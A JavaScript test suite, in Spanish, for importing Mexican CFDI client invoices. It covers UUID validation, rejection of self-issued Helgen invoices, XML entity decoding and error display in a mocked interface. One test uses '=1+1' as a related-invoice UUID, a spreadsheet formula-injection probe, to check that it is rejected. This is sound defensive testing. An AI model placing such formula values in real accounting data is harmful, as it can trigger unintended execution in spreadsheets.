  r = A.envio([{ nombre: 'nc.xml', datos: b64(cfdi({ tipo: 'E', uuid: U(91) }).replace('<cfdi:Emisor', '<cfdi:CfdiRelacionados TipoRelacion="01"><cfdi:CfdiRelacionado UUID="=1+1"/></cfdi:CfdiRelacionados><cfdi:Emisor')) }]);
  assert(/CFDI relacionado con un folio fiscal \(UUID\) no válido/.test(r.resultados[0].mensaje));
}

// ================= P7 · Helgen → Helgen no es una factura de cliente =================
{
  const A = crear();
  const aHelgen = o => b64(cfdi(Object.assign({ receptor: HELGEN, nombreReceptor: 'HELGEN SERVICIOS ESPECIALIZADOS' }, o)));
  const r = A.envio([{ nombre: 'auto-I.xml', datos: aHelgen({ uuid: U(4444) }) }, { nombre: 'auto-E.xml', datos: aHelgen({ tipo: 'E', uuid: U(4445) }) },
    { nombre: 'auto-P.xml', datos: aHelgen({ tipo: 'P', uuid: U(4446), pagos: [{ fecha: '2026-10-20', monto: '1.00', docs: [{ uuid: U(4444), ant: '1', pagado: '1', insoluto: '0' }] }] }) },
    { nombre: 'cliente.xml', datos: b64(cfdi({ uuid: U(4447) })) }]);
  assert.deepEqual(r.resultados.map(x => x.estado), ['rechazada', 'rechazada', 'rechazada', 'importada']);
  r.resultados.slice(0, 3).forEach(x => assert.equal(x.mensaje, 'Este CFDI lo emitió Helgen a la misma Helgen (receptor ' + HELGEN + '): no es una ' +
    'factura a un cliente y no se importa. Si se timbró por error, cancélalo en CONTALINK.'));
  assert.deepEqual([A.filas().map(f => f[0]), A.facturasDrive().length], [[U(4447)], 1]);
  // Un traslado (T) de Helgen a Helgen sigue diciendo que es un traslado
  assert.throws(() => A.P.validarFacturaCliente(A.P.leerCfdiCliente(cfdi({ tipo: 'T', receptor: HELGEN })), { rfcHelgen: HELGEN }), /traslado \(tipo T\)/);
}

// ================= P8 · referencias del XML (atributosXml, compartido con proveedores y gastos) =================
{
  const A = crear();
  const P = A.P;
  // La versión anterior, para comparar: para todo XML válido el resultado es el mismo
  function anterior(texto) {
    const r = {}, re = /([^\s=\/>]+)\s*=\s*(?:"([^"]*)"|'([^']*)')/g;
    let m;
    while ((m = re.exec(texto || ''))) {
      r[m[1]] = String(m[2] != null ? m[2] : m[3]).replace(/&#x([0-9a-fA-F]+);/g, (_, h) => String.fromCodePoint(parseInt(h, 16)))
        .replace(/&#(\d+);/g, (_, d) => String.fromCodePoint(Number(d))).replace(/&quot;/g, '"').replace(/&apos;/g, "'").replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>').replace(/&amp;/g, '&');
    }
    return r;
  }
  const at = v => A.plain(P.atributosXml('a="' + v + '"')).a;
  assert.equal(at('A &amp; B &lt;C&gt; &quot;D&quot; &apos;E&apos; &#241;&#xF1;&#x1F600; &#0065;'), 'A & B <C> "D" \'E\' ññ😀 A');
  assert.equal(at('A &#38;lt;b&#38;gt; B'), 'A &lt;b&gt; B', 'una sola vez');
  assert.deepEqual(['&#x26;amp;', '&#38;#60;', '&#x26;#x3C;', '&amp;lt;', '&amp;amp;'].map(at), ['&amp;', '&#60;', '&#x3C;', '&lt;', '&amp;']);
  assert.deepEqual(A.plain(P.atributosXml("x='1' y=\"&apos;2&apos;\" z = '&quot;'")), { x: '1', y: "'2'", z: '"' });
  // Fuera de Unicode o mitades de par sustituto: XML inválido, en español
  ['&#x110000;', '&#1114112;', '&#xD800;', '&#56320;', '&#99999999999999999999;', '&#x' + 'F'.repeat(40) + ';'].forEach(v => {
    assert.throws(() => at(v), e => e.name === 'Error' && /^El XML no es válido: trae una referencia a un carácter que no existe \(&#/.test(e.message) && e.message.length < 120, v);
  });
  // Comparado con la versión anterior en 20,000 valores de atributo como los de un XML bien formado (texto sin "&" suelto y
  // referencias completas: nombradas, decimales y hexadecimales, con código al azar, también fuera de Unicode). Se saltan las
  // referencias a "&" (&#38; &#x26;): con ellas la versión anterior decodificaba dos veces (lo que se arregló)
  let semilla = 7, comparados = 0, invalidos = 0;
  const azar = n => { semilla = (semilla * 1103515245 + 12345) % 2147483648; return semilla % n; };
  const textos = ['A', 'ñ', ' ', '#', ';', 'x', '3', '8', 'lt;', 'amp;', '#60;', 'gt', '0', 'F', 'é', 'SA de CV'];
  const pieza = () => {
    const k = azar(5), cp = [azar(0x80), azar(0x800), azar(0x10000), 0xD800 + azar(0x800), azar(0x120000)][azar(5)];
    if (k === 0) return textos[azar(textos.length)];
    if (k === 1) return '&' + ['amp', 'lt', 'gt', 'quot', 'apos'][azar(5)] + ';';
    if (k === 2) return '&#' + '0'.repeat(azar(3)) + cp + ';';
    const h = cp.toString(16);
    return '&#x' + '0'.repeat(azar(3)) + (azar(2) ? h.toUpperCase() : h) + ';';
  };
  const fueraDeUnicode = v => [...v.matchAll(/&#(?:x([0-9a-f]+)|(\d+));/gi)].some(m => { const cp = m[1] ? parseInt(m[1], 16) : Number(m[2]);
    return cp > 0x10FFFF || (cp >= 0xD800 && cp <= 0xDFFF); });
  for (let i = 0; i < 20000; i++) {
    const v = Array.from({ length: 1 + azar(8) }, pieza).join('');
    if (/&#(?:0*38|x0*26);/i.test(v)) continue;
    if (fueraDeUnicode(v)) { // antes: RangeError en inglés o una mitad de par sustituto suelta; ahora: el error en español
      assert.throws(() => at(v), /El XML no es válido/, v);
      invalidos++;
      continue;
    }
    assert.equal(at(v), anterior('a="' + v + '"').a, JSON.stringify(v));
    comparados++;
  }
  assert(comparados > 15000 && invalidos > 10, comparados + ' / ' + invalidos);
  // leerCfdi (proveedores y gastos) y leerCfdiCliente: el mismo error; con XML válido, la misma salida
  const xml = cfdi({ nombreReceptor: 'CLIENTE &#x110000; SA' }).replace('&amp;#x110000;', '&#x110000;');
  assert.throws(() => P.leerCfdi(xml), /^Error: El XML no es válido/);
  assert.throws(() => P.leerCfdiCliente(xml), e => /^El XML no es válido/.test(e.message) && !/Invalid code point/.test(e.message));
  assert.equal(P.leerCfdiCliente(cfdi({ nombreReceptor: 'X' }).replace('Nombre="X"', 'Nombre="A &#38;lt;b&#38;gt; B"')).receptor.nombre, 'A &lt;b&gt; B');
  const r = A.envio([{ nombre: 'raro.xml', datos: b64(xml) }, { nombre: 'bien.xml', datos: b64(cfdi({ uuid: U(2), folio: '2', nombreReceptor: 'Ñandú & Cía <SA>' })) }]);
  assert.deepEqual(r.resultados.map(x => [x.estado, x.receptor || '']), [['rechazada', ''], ['importada', 'Ñandú & Cía <SA>']]);
  assert(/^El XML no es válido/.test(r.resultados[0].mensaje));
}

// ================= P9 · mod-facturas: un error al actualizar se ve; lo viejo no pasa por algo al día =================
const A9 = crear();
A9.ctx.prepararCapri();
A9.envio([{ nombre: 'A-1.xml', datos: b64(cfdi({ uuid: U(1), folio: '1' })) }]);
const html = fs.readFileSync(path.join(dir, 'web/cotizador/index.html'), 'utf8');
const scripts = [...html.matchAll(/<script(?: id="([^"]*)")?>([\s\S]*?)<\/script>/g)].map(m => ({ id: m[1], src: m[2] }));
/** La interfaz (api-web, la app, mod-pantallas y mod-facturas) con un DOM mínimo, conectada al servidor simulado; forzar = {funcion: [codigo, error]}. */
function montar(quien, forzar) {
  const tok = o => Buffer.from(JSON.stringify(o)).toString('base64url');
  const token = 'h.' + tok({ email: quien + '@helgen.tech', given_name: quien, exp: Math.floor(Date.now() / 1000) + 3600 }) + '.f';
  function elemento(tag) {
    const e = { tag, value: '', textContent: '', className: '', title: '', src: '', placeholder: '', disabled: false, hijos: [], oyentes: {}, _clases: new Set(), porClase: {},
      classList: { add: c => e._clases.add(c), remove: c => e._clases.delete(c), contains: c => e._clases.has(c), toggle: (c, f) => f ? e._clases.add(c) : e._clases.delete(c) },
      addEventListener: (t, f) => (e.oyentes[t] = e.oyentes[t] || []).push(f), focus() {}, remove() {}, click() {}, appendChild: h => e.hijos.push(h),
      prepend: h => e.hijos.unshift(h), contains: () => false, querySelector: sel => e.porClase[sel] || (e.porClase[sel] = elemento('input')),
      querySelectorAll: sel => sel === 'tr' ? e.hijos : [] };
    let h = ''; Object.defineProperty(e, 'innerHTML', { get: () => h, set: x => { h = x; if (x === '') e.hijos.length = 0; } });
    return e;
  }
  const porId = {}, oyentesDoc = {};
  const document = { getElementById: i => porId[i] || (porId[i] = elemento('div')), querySelector: () => ({ src: 'data:logo' }), createElement: t => elemento(t),
    visibilityState: 'visible', activeElement: null, body: elemento('body'),
    addEventListener: (t, f) => (oyentesDoc[t] = oyentesDoc[t] || []).push(f), dispatchEvent: ev => (oyentesDoc[ev.type] || []).forEach(f => f(ev)) };
  document.getElementById('login').classList.add('oculto');
  ['tabCob', 'cobModFacturas', 'cobFacturas', 'cobVistaProyecto'].forEach(i => document.getElementById(i).classList.add('oculto'));
  const almacen = { cotizadorHelgenSesion: token }, llamadas = [];
  async function fetch(url, o) {
    const c = JSON.parse(o.body); llamadas.push(c);
    const f = forzar[c.funcion];
    return { ok: true, json: async () => f ? { ok: false, error: f[1], codigo: f[0] } : A9.post(quien, c.funcion, ...c.args) };
  }
  const ctx = { document, fetch, console, JSON, Date, Math, Number, String, Array, Object, Promise, Proxy, Error, Uint8Array, TextDecoder,
    atob: s => Buffer.from(s, 'base64').toString('binary'), crypto: { randomUUID: () => 'id-' + Math.random() },
    sessionStorage: { getItem: k => almacen[k] ?? null, setItem: (k, x) => almacen[k] = x, removeItem: k => delete almacen[k] },
    localStorage: { getItem: () => null, setItem() {}, removeItem() {} }, confirm: () => true, prompt: () => null,
    CustomEvent: class { constructor(type, o) { this.type = type; this.detail = o && o.detail; } },
    setTimeout: (f, ms) => setTimeout(f, Math.min(ms || 0, 5)), clearTimeout, setInterval: () => 0, scrollTo() {} };
  ctx.window = ctx;
  vm.createContext(ctx);
  ['api-web', undefined, 'mod-pantallas', 'mod-facturas'].forEach(n => vm.runInContext(scripts.find(s => s.id === n).src, ctx));
  return { $: i => document.getElementById(i), llamadas, run: c => vm.runInContext(c, ctx) };
}
const esperar = async (k = 30) => { for (let i = 0; i < k; i++) await new Promise(r => setImmediate(r)); };
(async () => {
  const forzar = {};
  const T = montar('tania', forzar);
  await esperar();
  T.run("verTab('cob')"); T.run('FACTURAS_CLI.cargar()'); await esperar();
  assert(T.run('FACTURAS_CLI.estado().lista') && /A-1/.test(T.$('facTabla').innerHTML), 'la lista cargó');
  assert(!/No se pudieron/.test(T.$('facConteos').innerHTML));
  // Falla la red (u otro error): el error se ve arriba y en el bloque; lo de antes se queda, marcado sin actualizar
  forzar.listarFacturasClientes = ['', 'No se pudo conectar con el servidor.'];
  T.run('FACTURAS_CLI.cargar()'); await esperar();
  assert.equal(T.run('FACTURAS_CLI.estado().error'), 'No se pudo conectar con el servidor.');
  assert(/^No se pudieron actualizar las facturas de clientes: No se pudo conectar con el servidor\.$/.test(T.$('aviso').innerHTML), T.$('aviso').innerHTML);
  assert(/No se pudieron actualizar las facturas: No se pudo conectar con el servidor\. Lo de abajo es de la última carga \([^)]+\) y puede no estar al día\. <a[^>]*FACTURAS_CLI\.cargar\(\)/.test(T.$('facConteos').innerHTML), T.$('facConteos').innerHTML);
  assert(/class="tiles" style="opacity:\.55"/.test(T.$('facConteos').innerHTML) && /title="Sin actualizar: la última carga falló"/.test(T.$('facTabla').innerHTML), 'atenuado');
  // Sin permiso (PERMISO): el error se ve y la lista se quita (no se muestra lo que el servidor ya no da)
  forzar.listarFacturasClientes = ['PERMISO', 'No tienes permiso de cobranza.'];
  T.run('FACTURAS_CLI.cargar()'); await esperar();
  assert.deepEqual([T.run('FACTURAS_CLI.estado().lista'), T.run('FACTURAS_CLI.estado().codigoError'), T.$('facTabla').innerHTML], [null, 'PERMISO', '']);
  assert(/^No se pudieron cargar las facturas de clientes: No tienes permiso de cobranza\.$/.test(T.$('aviso').innerHTML));
  assert(/No se pudieron cargar las facturas: No tienes permiso de cobranza\. <a/.test(T.$('facConteos').innerHTML) && !/A-1/.test(T.$('facConteos').innerHTML + T.$('facFiltros').innerHTML));
  // Vuelve a funcionar: lista al día, sin error ni atenuado
  delete forzar.listarFacturasClientes;
  T.run('FACTURAS_CLI.cargar()'); await esperar();
  assert.deepEqual([T.run('FACTURAS_CLI.estado().error'), !!T.run('FACTURAS_CLI.estado().lista')], ['', true]);
  assert(!/No se pudieron|opacity/.test(T.$('facConteos').innerHTML + T.$('facTabla').innerHTML));
  console.log('OK revisión 7 · importar facturas de clientes (ZIP por índice y por envío, archivo malo sin tumbar el envío ni dejar huérfanos, regla 7, ' +
    'Helgen→Helgen, referencias del XML, errores de mod-facturas)');
})().catch(e => { console.error(e); process.exit(1); });
